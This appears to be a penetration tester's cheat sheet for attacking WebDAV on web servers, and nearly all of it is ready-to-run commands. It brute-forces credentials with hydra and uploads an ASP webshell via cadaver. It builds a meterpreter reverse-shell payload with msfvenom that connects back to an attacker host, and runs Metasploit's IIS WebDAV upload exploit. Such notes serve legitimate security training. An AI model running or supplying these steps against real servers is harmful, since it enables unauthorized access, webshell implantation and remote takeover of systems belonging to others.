# HTTP

## WebDAV
- WebDAV typically runs on Apache on MS IIS.
  - Manage files on remote Web server.
  - Requires credentials.

- "DAVTest tests WebDAV-enabled servers by uploading test executable files, and then (optionally) uploading files which allow for command execution or other actions directly on the target. It is meant for penetration testers to quickly and easily determine if enabled DAV services are exploitable."

- "cadaver is a command-line WebDAV client, with support for file upload, download..."

```
nmap -Pn -sV -p80 --script=http-webdav-scan,http-enum <ip>
```

```
hydra -L /usr/share/wordlists/metasploit/unix_users.txt -P /usr/share/wordlists/metasploit/unix_passwords.txt <ip> http-get /webdav
```

```
curl http://<ip>/webdav/ -u <username>:<password>
```

```
davtest -url http://<ip>/webdav -auth <username>:<password>
```

```
cadaver http://<ip>/webdav
Username: <username>
Password: <password>

dav:/webdav/> help
dav:/webdav/> ls
dav:/webdav/> put /usr/share/webshells/asp/webshell.asp
==> A webshell is a shell that you can access through the Web. It is NOT a reverse shell.

http://<ip>/webdav/webshell.asp
```

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ip> LPORT=<port> -f asp > reverse.asp

use /multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST <ip>
set LPORT <port>
exploit

http://<ip>/webdav/reverse.asp
```

```
use auxiliary/scanner/http/webdav_scanner

use exploit/windows/iis/iis_webdav_upload_asp
set payload windows/meterpreter/reverse_tcp
set HttpUsername <username>
set HttpPassword <password>
set PATH /webdav/reverse.asp
```
